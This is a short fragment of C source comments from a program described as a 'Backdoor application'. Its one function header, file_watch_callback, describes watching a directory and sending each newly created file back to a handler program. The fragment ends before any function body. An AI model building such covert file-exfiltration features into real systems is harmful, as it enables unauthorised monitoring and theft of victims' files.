 ...
 *
 * NOTES:
 * The program is an entry point to Backdoor application
 * ----------------------------------------------------------------------------------------------------------------------------*/
 ...
 * PROGRAMMER:     Derek Wong, Bin Zhu
 *
 * INTERFACE:      void file_watch_callback(char *filename)
 *
 * RETURNS:        void
 *
 * NOTES:
 * Monitoring directory file functionality, if a file is created, send it back to the handler program
 * ------------------------------------------------------------------------------------------------------------------------------*/
void file_watch_callback(char *filename)
{
